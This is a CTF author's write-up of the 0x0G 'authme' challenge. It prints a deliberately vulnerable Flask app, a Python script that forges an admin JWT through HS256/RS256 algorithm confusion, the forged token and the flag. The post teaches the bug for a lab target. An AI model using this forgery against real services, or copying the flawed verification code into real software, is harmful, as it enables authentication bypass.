---
layout: post
title: "0x0G CTF: Authme (Author Writeup)"
category: Security
date: 2021-08-12
tags:
  - CTF
  - 0x0G
---

0x0G is Google's annual "Hacker Summer Camp" event.  *Normally* this would be in
Las Vegas during the week of DEF CON and Black Hat, but well, pandemic rules
apply.  I'm one of the organizers for the CTF we run during the event, and I
thought I'd write up solutions to some of my challenges here.

The first such challenge is `authme`, a web/crypto challenge.  The description
just wants to know if you can auth as admin and directs you to a website.  On
the website, we find a link to the source code, to an RSA public key, and a
login form.

<!--more-->

Attempting to login, we are told to try "test/test" for demo purposes.  Using
"test/test", we are logged in, but it just says "Welcome, test" -- not the
exciting output we were hoping for.  Let's examine the source:

```python
import flask
import jwt
import collections
import logging
import hashlib


app = flask.Flask(__name__)
app.logger.setLevel(logging.INFO)

KeyType = collections.namedtuple(
        'KeyType',
        ('algo', 'pubkey', 'key'),
        defaults=(None, None))

COOKIE_NAME = 'authme_session'

DEFAULT_KEY = 'k2'
KEYS = {
        'k1': KeyType(
            'HS256',
            key=open('k1.txt').read().strip()),
        'k2': KeyType(
            'RS256',
            key=open('privkey.pem').read().strip(),
            pubkey=open('pubkey.pem').read().strip()),
        }

FLAG = open('flag.txt', 'r').read()


def jwt_encode(payload, kid=DEFAULT_KEY):
    key = KEYS[kid]
    return jwt.encode(
            payload,
            key=key.key,
            algorithm=key.algo,
            headers={'kid': kid})


def jwt_decode(data):
    header = jwt.get_unverified_header(data)
    kid = header.get('kid')
    if kid not in KEYS:
        raise jwt.InvalidKeyError("Unknown key!")
    return jwt.decode(
            data,
            key=(KEYS[kid].pubkey or KEYS[kid].key),
            algorithms=['HS256', 'RS256'])


def get_user_info():
    sess = flask.request.cookies.get(COOKIE_NAME)
    if sess:
        return jwt_decode(sess)
    return None


@app.route("/")
def home():
    try:
        user = get_user_info()
    except Exception as ex:
        app.logger.info('JWT error: %s', ex)
        return flask.render_template(
                "index.html",
                error="Error loading session!")
    return flask.render_template(
            "index.html",
            user=user,
            flag=FLAG,
            )


@app.route("/login", methods=['POST'])
def login():
    u = flask.request.form.get('username')
    p = flask.request.form.get('password')
    if u == "test" and p == "test":
        # do login
        resp = flask.redirect("/")
        resp.set_cookie(COOKIE_NAME, jwt_encode({"username": u}))
        return resp
    # render login error page
    return flask.render_template(
            "index.html",
            error="Invalid username/password.  Try test/test for testing!"
            )


@app.route("/pubkey/<kid>")
def get_pubkey(kid):
    if kid in KEYS:
        key = KEYS[kid].pubkey
        if key is not None:
            resp = flask.make_response(key)
            resp.headers['Content-type'] = 'text/plain'
            return resp
    flask.abort(404)


@app.route("/authme.py")
def get_authme():
    contents = open(__file__).read()
    resp = flask.make_response(contents)
    resp.headers['Content-type'] = 'text/plain'
    return resp


def prepare_key(unused_self, k):
    if k is None:
        raise ValueError('Missing key!')
    if len(k) < 32:
        return jwt.utils.force_bytes(hashlib.sha256(k).hexdigest())
    return jwt.utils.force_bytes(k)


jwt.algorithms.HMACAlgorithm.prepare_key = prepare_key
```

A few things should stand out to you:

- The flag is passed to the template no matter what, so it's probably some
  simple template logic to determine whether or not to show the flag.
- The only username and password accepted for login is a hard-coded value of
  "test" and "test".
- We see that [JWTs](https://jwt.io/introduction) are being used to manage user
  sessions.  These are stored in a session cookie, creatively called
  `authme_session`.
- There's multiple keys and algorithms supported.

The RSA public key is provided, but there's no indication that it's a weak key
in any way.  (It's not, as far as I know...)  When verifying the JWT, it's worth
noting that *rather than passing the algorithm for the specific key, the library
is passed both RS256 and HS256*.  This means that both keys can be used with
both algorithms when *decoding* the session.

Using an HMAC-SHA-256 key as an RSA key is probably not helpful (especially if
you don't know the HMAC key), but what about the reverse -- using an RSA key as
an HMAC-SHA-256 key?  Examining the code, it shows that the **public** key is
passed in to the verification function.  Maybe we can sign a JWT using the
public RSA key, but the `HS256` algorithm in the JWT?

```python
import jwt

def prepare_key(unused_self, k):
    if k is None:
        raise ValueError('Missing key!')
    if len(k) < 32:
        return jwt.utils.force_bytes(hashlib.sha256(k).hexdigest())
    return jwt.utils.force_bytes(k)

jwt.algorithms.HMACAlgorithm.prepare_key = prepare_key

key = open('k2', 'rb').read()
print(jwt.encode({"username": "admin"}, key=key, algorithm='HS256',
    headers={"kid": "k2"}))
```

`prepare_key` is copied directly from the `authme` source.  This prints *a* JWT,
but does it work?

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImsyIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.4DQoSTcZtY1nSzclaEEcp03_C51yR7tneNzYWm6QDuc
```

If we put this into our session cookie in our browser and refresh, we're
presented with the reward:

```
0x0g{jwt_lots_of_flexibility_to_make_mistakes}
```

This is a vulnerability called JWT Algorithm Confusion.  See
[Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/), [JSON Web Token attacks and vulnerabilities](https://www.netsparker.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/) for more about this.
